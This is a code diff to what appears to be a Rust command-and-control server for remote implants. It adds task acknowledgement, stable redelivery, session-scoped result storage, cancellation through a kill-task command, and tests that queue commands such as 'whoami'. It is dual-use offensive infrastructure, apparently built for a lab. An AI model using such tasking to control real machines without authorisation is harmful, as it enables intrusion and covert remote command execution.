@@ -159,19 +159,32 @@ async fn process_sealed_poll(repo: &Repository, env: Envelope) -> Result<Envelop
     repo.touch_callback(&session_id.to_string())
         .await
         .map_err(|_| C2Error::Internal)?;
-    for result in request.results {
-        repo.store_task_result(
-            &result.task_id.to_string(),
-            result.ok,
-            &result.stdout,
-            &result.stderr,
-            result.exit_code,
-        )
+    let mut accepted_ids = request.acked_ids;
+    accepted_ids.extend(request.accepted_task_ids);
+    accepted_ids.sort_unstable();
+    accepted_ids.dedup();
+    repo.acknowledge_tasks(&session_id.to_string(), &accepted_ids)
         .await
-        .map_err(|_| C2Error::Internal)?;
+        .map_err(|_| C2Error::BadRequest)?;
+    let mut result_acks = Vec::new();
+    for result in request.results {
+        if repo
+            .store_task_result_for_session(
+                &session_id.to_string(),
+                &result.task_id.to_string(),
+                result.ok,
+                &result.stdout,
+                &result.stderr,
+                result.exit_code,
+            )
+            .await
+            .map_err(|_| C2Error::Internal)?
+        {
+            result_acks.push(result.task_id);
+        }
     }
     let tasks = repo
-        .fetch_pending_tasks(&session_id.to_string())
+        .tasks_for_delivery(&session_id.to_string())
         .await
         .map_err(|_| C2Error::Internal)?
         .into_iter()
@@ -191,6 +204,7 @@ async fn process_sealed_poll(repo: &Repository, env: Envelope) -> Result<Envelop
     };
     let reply = PollReply {
         tasks,
+        result_acks,
         acks: Vec::new(),
         push_chunks: Vec::new(),
     };
@@ -270,28 +284,42 @@ async fn poll(
         .ok_or(StatusCode::UNAUTHORIZED)?;
     let key = deb64(&key_b64).map_err(|_| StatusCode::UNAUTHORIZED)?;
     let pt = crypto::decrypt(&key, env.id, &env.encrypted).map_err(|_| StatusCode::UNAUTHORIZED)?;
-    let _req: PollRequest = serde_json::from_slice(&pt).map_err(|_| StatusCode::BAD_REQUEST)?;
+    let request: PollRequest = serde_json::from_slice(&pt).map_err(|_| StatusCode::BAD_REQUEST)?;
 
     repo.touch_callback(&sid.to_string())
         .await
         .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
 
     // Store any task results the implant reported.
-    for result in &_req.results {
-        let _ = repo
-            .store_task_result(
+    let mut accepted_ids = request.acked_ids;
+    accepted_ids.extend(request.accepted_task_ids);
+    accepted_ids.sort_unstable();
+    accepted_ids.dedup();
+    repo.acknowledge_tasks(&sid.to_string(), &accepted_ids)
+        .await
+        .map_err(|_| StatusCode::BAD_REQUEST)?;
+
+    let mut result_acks = Vec::new();
+    for result in &request.results {
+        if repo
+            .store_task_result_for_session(
+                &sid.to_string(),
                 &result.task_id.to_string(),
                 result.ok,
                 &result.stdout,
                 &result.stderr,
                 result.exit_code,
             )
-            .await;
+            .await
+            .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?
+        {
+            result_acks.push(result.task_id);
+        }
     }
 
     // Fetch pending tasks for this session and mark them as delivered/processing.
     let tasks = repo
-        .fetch_pending_tasks(&sid.to_string())
+        .tasks_for_delivery(&sid.to_string())
         .await
         .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
 
@@ -303,7 +331,7 @@ async fn poll(
                 .ok()
                 .and_then(|args| {
                     Some(Task {
-                        id: Uuid::new_v4(),
+                        id: Uuid::parse_str(&t.id).ok()?,
                         command: t.command.clone(),
                         args,
                         timeout_ms: t.timeout_ms,
@@ -311,8 +339,13 @@ async fn poll(
                 })
         })
         .collect();
-    let plaintext =
-        serde_json::to_vec(&task_msgs).map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+    let reply = PollReply {
+        tasks: task_msgs,
+        result_acks,
+        acks: Vec::new(),
+        push_chunks: Vec::new(),
+    };
+    let plaintext = serde_json::to_vec(&reply).map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
     let out = crypto::encrypt(&key, reply_id, &plaintext)
         .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
     Ok(Json(Envelope::new(
@@ -446,6 +479,309 @@ mod tests {
     fn b64(b: &[u8]) -> String {
         use base64::Engine;
         base64::engine::general_purpose::STANDARD.encode(b)
+    }
+
+    async fn seed_poll_session(repo: &Repository, key: &[u8; crypto::KEY_LEN]) -> Uuid {
+        let session_id = Uuid::new_v4();
+        sqlx::query(
+            "INSERT INTO c2_sessions (id, hostname, username, os, arch, pid, addr, session_key, last_seen) \
+             VALUES (?, 'host', 'user', 'linux', 'x86_64', 1, '127.0.0.1', ?, strftime('%Y-%m-%dT%H:%M:%fZ', 'now'))",
+        )
+        .bind(session_id.to_string())
+        .bind(key.to_vec())
+        .execute(&repo.pool)
+        .await
+        .unwrap();
+        sqlx::query(
+            "INSERT INTO callbacks (id, host, user_name, process, arch, os, protocol, status, session_key) \
+             VALUES (?, 'host', 'user', 'implant', 'x86_64', 'linux', 'http', 'active', ?)",
+        )
+        .bind(session_id.to_string())
+        .bind(b64(key))
+        .execute(&repo.pool)
+        .await
+        .unwrap();
+        session_id
+    }
+
+    async fn sealed_poll(
+        repo: &Repository,
+        session_id: Uuid,
+        key: &[u8; crypto::KEY_LEN],
+        id: u64,
+        request: PollRequest,
+    ) -> PollReply {
+        let encrypted = crypto::encrypt(key, id, &serde_json::to_vec(&request).unwrap()).unwrap();
+        let reply = process_sealed_poll(
+            repo,
+            Envelope::new(Kind::TaskResult, id, Some(session_id), encrypted),
+        )
+        .await
+        .unwrap();
+        let plaintext = crypto::decrypt(key, reply.id, &reply.encrypted).unwrap();
+        serde_json::from_slice(&plaintext).unwrap()
+    }
+
+    #[tokio::test]
+    async fn unacknowledged_task_is_redelivered_with_stable_id() {
+        let pool = crate::db::create_pool("sqlite::memory:").await.unwrap();
+        crate::db::run_migrations(&pool).await.unwrap();
+        let repo = Repository { pool };
+        let key = crypto::derive_key(b"poll-test-key", b"poll-test-salt");
+        let session_id = seed_poll_session(&repo, &key).await;
+        let task_id = repo
+            .enqueue_task(
+                &session_id.to_string(),
+                "whoami",
+                &serde_json::json!([]),
+                5_000,
+            )
+            .await
+            .unwrap();
+
+        let first = sealed_poll(&repo, session_id, &key, 1, PollRequest::default()).await;
+        let second = sealed_poll(&repo, session_id, &key, 2, PollRequest::default()).await;
+        assert_eq!(first.tasks.len(), 1);
+        assert_eq!(second.tasks.len(), 1);
+        assert_eq!(first.tasks[0].id.to_string(), task_id);
+        assert_eq!(second.tasks[0].id, first.tasks[0].id);
+
+        let acknowledged = sealed_poll(
+            &repo,
+            session_id,
+            &key,
+            3,
+            PollRequest {
+                acked_ids: vec![first.tasks[0].id],
+                ..Default::default()
+            },
+        )
+        .await;
+        assert!(acknowledged.tasks.is_empty());
+        let status: String = sqlx::query_scalar("SELECT status FROM c2_tasks WHERE id = ?")
+            .bind(task_id)
+            .fetch_one(&repo.pool)
+            .await
+            .unwrap();
+        assert_eq!(status, "processing");
+    }
+
+    async fn terminal_audit_count(repo: &Repository, task_id: &str) -> i64 {
+        sqlx::query_scalar(
+            "SELECT COUNT(*) FROM c2_audit WHERE details = ? \
+             AND action IN ('task_completed', 'task_error', 'task_cancelled')",
+        )
+        .bind(format!("task {task_id}"))
+        .fetch_one(&repo.pool)
+        .await
+        .unwrap()
+    }
+
+    #[tokio::test]
+    async fn pending_cancellation_is_immediate_and_has_one_terminal_audit() {
+        let pool = crate::db::create_pool("sqlite::memory:").await.unwrap();
+        crate::db::run_migrations(&pool).await.unwrap();
+        let repo = Repository { pool };
+        let key = crypto::derive_key(b"cancel-pending", b"test");
+        let sid = seed_poll_session(&repo, &key).await;
+        let task_id = repo
+            .enqueue_task(
+                &sid.to_string(),
+                "sleep",
+                &serde_json::json!(["30"]),
+                60_000,
+            )
+            .await
+            .unwrap();
+
+        assert_eq!(
+            repo.request_task_cancellation(&sid.to_string(), &task_id, "operator-1", "alice")
+                .await
+                .unwrap(),
+            crate::db::models::TaskCancellation::Cancelled
+        );
+        assert_eq!(
+            repo.request_task_cancellation(&sid.to_string(), &task_id, "operator-1", "alice")
+                .await
+                .unwrap(),
+            crate::db::models::TaskCancellation::AlreadyTerminal
+        );
+        let status: String = sqlx::query_scalar("SELECT status FROM c2_tasks WHERE id = ?")
+            .bind(&task_id)
+            .fetch_one(&repo.pool)
+            .await
+            .unwrap();
+        assert_eq!(status, "cancelled");
+        assert_eq!(terminal_audit_count(&repo, &task_id).await, 1);
+    }
+
+    #[tokio::test]
+    async fn task_acknowledgements_are_atomic_and_session_owned() {
+        let pool = crate::db::create_pool("sqlite::memory:").await.unwrap();
+        crate::db::run_migrations(&pool).await.unwrap();
+        let repo = Repository { pool };
+        let key = crypto::derive_key(b"ack-ownership", b"test");
+        let sid_a = seed_poll_session(&repo, &key).await;
+        let sid_b = seed_poll_session(&repo, &key).await;
+        let owned = repo
+            .enqueue_task(&sid_a.to_string(), "one", &serde_json::json!([]), 1_000)
+            .await
+            .unwrap();
+        let foreign = repo
+            .enqueue_task(&sid_b.to_string(), "two", &serde_json::json!([]), 1_000)
+            .await
+            .unwrap();
+        repo.tasks_for_delivery(&sid_a.to_string()).await.unwrap();
+        repo.tasks_for_delivery(&sid_b.to_string()).await.unwrap();
+
+        let error = repo
+            .acknowledge_tasks(
+                &sid_a.to_string(),
+                &[
+                    Uuid::parse_str(&owned).unwrap(),
+                    Uuid::parse_str(&foreign).unwrap(),
+                ],
+            )
+            .await;
+        assert!(matches!(error, Err(crate::error::AppError::NotFound)));
+        let status: String = sqlx::query_scalar("SELECT status FROM c2_tasks WHERE id = ?")
+            .bind(owned)
+            .fetch_one(&repo.pool)
+            .await
+            .unwrap();
+        assert_eq!(status, "delivered");
+    }
+
+    #[tokio::test]
+    async fn processing_cancellation_uses_one_killtask_and_one_terminal_outcome() {
+        let pool = crate::db::create_pool("sqlite::memory:").await.unwrap();
+        crate::db::run_migrations(&pool).await.unwrap();
+        let repo = Repository { pool };
+        let key = crypto::derive_key(b"cancel-processing", b"test");
+        let sid = seed_poll_session(&repo, &key).await;
+        let task_id = repo
+            .enqueue_task(
+                &sid.to_string(),
+                "sleep",
+                &serde_json::json!(["30"]),
+                60_000,
+            )
+            .await
+            .unwrap();
+        repo.tasks_for_delivery(&sid.to_string()).await.unwrap();
+        repo.acknowledge_tasks(&sid.to_string(), &[Uuid::parse_str(&task_id).unwrap()])
+            .await
+            .unwrap();
+
+        let first = repo
+            .request_task_cancellation(&sid.to_string(), &task_id, "operator-1", "alice")
+            .await
+            .unwrap();
+        let second = repo
+            .request_task_cancellation(&sid.to_string(), &task_id, "operator-1", "alice")
+            .await
+            .unwrap();
+        assert_eq!(first, second);
+        let crate::db::models::TaskCancellation::Requested { control_task_id } = first else {
+            panic!("processing cancellation must queue nw/killtask");
+        };
+        let control: (String, serde_json::Value, Option<String>) =
+            sqlx::query_as("SELECT command, args_json, parent_task_id FROM c2_tasks WHERE id = ?")
+                .bind(control_task_id)
+                .fetch_one(&repo.pool)
+                .await
+                .unwrap();
+        assert_eq!(control.0, "nw/killtask");
+        assert_eq!(control.1, serde_json::json!([task_id]));
+        assert_eq!(control.2.as_deref(), Some(task_id.as_str()));
+
+        assert!(
+            repo.store_task_result_for_session(
+                &sid.to_string(),
+                &task_id,
+                false,
+                b"",
+                b"task cancelled",
+                -1,
+            )
+            .await
+            .unwrap()
+        );
+        // A replayed result is acknowledged but must not create a second audit outcome.
+        assert!(
+            repo.store_task_result_for_session(
+                &sid.to_string(),
+                &task_id,
+                false,
+                b"",
+                b"task cancelled",
+                -1,
+            )
+            .await
+            .unwrap()
+        );
+        let status: String = sqlx::query_scalar("SELECT status FROM c2_tasks WHERE id = ?")
+            .bind(&task_id)
+            .fetch_one(&repo.pool)
+            .await
+            .unwrap();
+        assert_eq!(status, "cancelled");
+        assert_eq!(terminal_audit_count(&repo, &task_id).await, 1);
+        let requests: i64 = sqlx::query_scalar(
+            "SELECT COUNT(*) FROM c2_audit WHERE action = 'task_cancellation_requested' AND details = ?",
+        )
+        .bind(format!("task {task_id}"))
+        .fetch_one(&repo.pool)
+        .await
+        .unwrap();
+        assert_eq!(requests, 1);
+    }
+
+    #[tokio::test]
+    async fn completion_wins_before_late_cancellation_request() {
+        let pool = crate::db::create_pool("sqlite::memory:").await.unwrap();
+        crate::db::run_migrations(&pool).await.unwrap();
+        let repo = Repository { pool };
+        let key = crypto::derive_key(b"completion-wins", b"test");
+        let sid = seed_poll_session(&repo, &key).await;
+        let task_id = repo
+            .enqueue_task(
+                &sid.to_string(),
+                "printf",
+                &serde_json::json!(["done"]),
+                5_000,
+            )
+            .await
+            .unwrap();
+        repo.tasks_for_delivery(&sid.to_string()).await.unwrap();
+        repo.acknowledge_tasks(&sid.to_string(), &[Uuid::parse_str(&task_id).unwrap()])
+            .await
+            .unwrap();
+        repo.store_task_result_for_session(&sid.to_string(), &task_id, true, b"done", b"", 0)
+            .await
+            .unwrap();
+
+        assert_eq!(
+            repo.request_task_cancellation(&sid.to_string(), &task_id, "operator-1", "alice")
+                .await
+                .unwrap(),
+            crate::db::models::TaskCancellation::AlreadyTerminal
+        );
+        let status: String = sqlx::query_scalar("SELECT status FROM c2_tasks WHERE id = ?")
+            .bind(&task_id)
+            .fetch_one(&repo.pool)
+            .await
+            .unwrap();
+        assert_eq!(status, "completed");
+        assert_eq!(terminal_audit_count(&repo, &task_id).await, 1);
+        let killtasks: i64 = sqlx::query_scalar(
+            "SELECT COUNT(*) FROM c2_tasks WHERE parent_task_id = ? AND command = 'nw/killtask'",
+        )
+        .bind(task_id)
+        .fetch_one(&repo.pool)
+        .await
+        .unwrap();
+        assert_eq!(killtasks, 0);
     }
 
     #[tokio::test]
@@ -651,16 +987,39 @@ mod tests {
         let result_wire = Envelope::new(Kind::TaskResult, 3, Some(ack.session_id), result_ct)
             .seal(&key)
             .unwrap();
-        process_sealed(&repo, psk, result_wire.as_bytes(), "gs")
+        let result_reply_wire = process_sealed(&repo, psk, result_wire.as_bytes(), "gs")
             .await
             .unwrap();
+        let result_reply_env =
+            Envelope::open(&key, std::str::from_utf8(&result_reply_wire).unwrap()).unwrap();
+        let result_reply_pt =
+            crypto::decrypt(&key, result_reply_env.id, &result_reply_env.encrypted).unwrap();
+        let result_reply: PollReply = serde_json::from_slice(&result_reply_pt).unwrap();
+        assert_eq!(result_reply.result_acks, vec![reply.tasks[0].id]);
+
+        // Lost result acknowledgements cause a replay; storage and terminal
+        // audit remain idempotent while the server acknowledges it again.
+        let replay_ct = crypto::encrypt(&key, 4, &serde_json::to_vec(&completed).unwrap()).unwrap();
+        let replay_wire = Envelope::new(Kind::TaskResult, 4, Some(ack.session_id), replay_ct)
+            .seal(&key)
+            .unwrap();
+        let replay_reply_wire = process_sealed(&repo, psk, replay_wire.as_bytes(), "gs")
+            .await
+            .unwrap();
+        let replay_reply_env =
+            Envelope::open(&key, std::str::from_utf8(&replay_reply_wire).unwrap()).unwrap();
+        let replay_reply_pt =
+            crypto::decrypt(&key, replay_reply_env.id, &replay_reply_env.encrypted).unwrap();
+        let replay_reply: PollReply = serde_json::from_slice(&replay_reply_pt).unwrap();
+        assert_eq!(replay_reply.result_acks, vec![reply.tasks[0].id]);
         let output: Vec<u8> =
             sqlx::query_scalar("SELECT stdout FROM c2_task_results WHERE task_id = ?")
-                .bind(queued)
+                .bind(&queued)
                 .fetch_one(&pool)
                 .await
                 .unwrap();
         assert_eq!(output, b"lab-user");
+        assert_eq!(terminal_audit_count(&repo, &queued).await, 1);
     }
 
     #[test]
